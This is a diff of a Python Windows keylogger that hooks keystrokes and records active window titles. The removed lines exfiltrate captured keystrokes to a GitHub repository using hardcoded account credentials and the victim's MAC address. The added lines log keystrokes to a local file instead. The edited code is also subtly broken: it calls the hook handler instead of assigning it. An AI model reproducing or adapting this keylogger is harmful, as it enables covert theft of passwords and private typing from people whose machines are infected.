@@ -3,12 +3,7 @@ import pythoncom
 import pyHook
 import win32clipboard
 import win32api
-import time
-import wmi 
-import os 
-import stat
 
-from github3 import *
 
 
 
@@ -18,25 +13,7 @@ psapi = windll.psapi
 current_window = None
 
 
-def connect_to_github():
-    gh = login(username="OXVyeah", password="heiya233")
-    #print(gh)
-    repo = gh.repository("OXVyeah", "yeah")
-    return repo
 
-def network(): 
-    c = wmi.WMI ()
-    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
-        print "MAC: %s" % interface.MACAddress 
-        return str(interface.MACAddress).replace(":","-")
-
-def upKeyboard(rep,msg,pcname):
-    if rep.contents("data/"+pcname+"/keyboard.txt") == None :
-#	print "ip"
-        rep.create_file("data/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
-    con = rep.contents("data/"+pcname+"/keyboard.txt")
-    d,t = fileOperation.getLocalTime()
-    upFile(con,msg,"upload keyboard "+d+" "+t)
 
 
 def get_current_process():
@@ -74,10 +51,10 @@ def get_current_process():
     kernel32.CloseHandle(h_process)
 
 
-def KeyStroke(event):
+def KeyStroke(event,repo,mac):
     global current_window
-    r=connect_to_github()
-    m=network()
+    fileHandle = open ('C:\\pyworks\\before\\keylogger.txt', 'a' )
+
     msg = ""
 
     # check to see if target changed windows
@@ -104,7 +81,8 @@ def KeyStroke(event):
             msg += "[%s]" % event.Key
             print "[%s]" % event.Key,
     
-    upKeyboard(r,msg,mac)
+    fileHandle.write(msg)
+    fileHandle.close()
     # pass execution to next hook registered
     return True
 
@@ -113,7 +91,7 @@ def KeyStroke(event):
 
 
 
-def run():
+def run(repo,mac):
     print "\n 0000000"
     ti=0
     while ti<5 :
@@ -122,7 +100,7 @@ def run():
         ti+=1
         kl = pyHook.HookManager()
         print 1
-        kl.KeyDown = KeyStroke
+        kl.KeyDown = KeyStroke(repo,mac)
         print 2
         kl.HookKeyboard()
         print 3
